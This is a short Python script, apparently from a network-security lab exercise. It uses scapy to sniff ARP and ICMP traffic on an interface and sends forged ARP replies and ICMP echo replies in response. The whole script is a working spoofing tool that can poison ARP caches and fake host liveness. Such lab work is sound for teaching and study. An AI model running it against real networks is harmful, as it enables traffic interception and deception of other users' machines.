#!/usr/bin/env python3
import sys
from scapy.all import *

def main():
    if len(sys.argv) != 2:
        sys.exit("Usage: ./sniff_spoof.py <INTERFACE>")
    
    iface_ = sys.argv[1]
    print(f'listening for packets on {iface_}')
    sniff(iface = iface_, filter = 'icmp || arp', prn = sniff_)
    
def sniff_(pkt):
    try:
        # Handle ARP packets
        if pkt[ARP].op == 1:
            arp = ARP(op = 2, hwsrc = pkt[Ether].dst, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc)
            send(arp, verbose=0)
            print(pkt.sprintf("spoofed ARP Reply--> %ARP.pdst% -> %ARP.psrc%"))
        elif pkt[ARP].op == 2:
            print(pkt.sprintf("non-spoofed ARP Reply--> %ARP.psrc% -> %ARP.pdst%"))
    except IndexError:
        # Handle ICMP packets
        if pkt[ICMP].type == 8:
            ip = IP(src = pkt[IP].dst, dst = pkt[IP].src, ihl = pkt[IP].ihl)
            icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq)
            data = pkt[Raw].load
            send(ip/icmp/data, verbose=0)
        elif pkt[ICMP].type == 0:
            print(pkt.sprintf("ICMP Reply --> %IP.src% -> %IP.dst%"))
        
        
if __name__ == '__main__':
    main()        
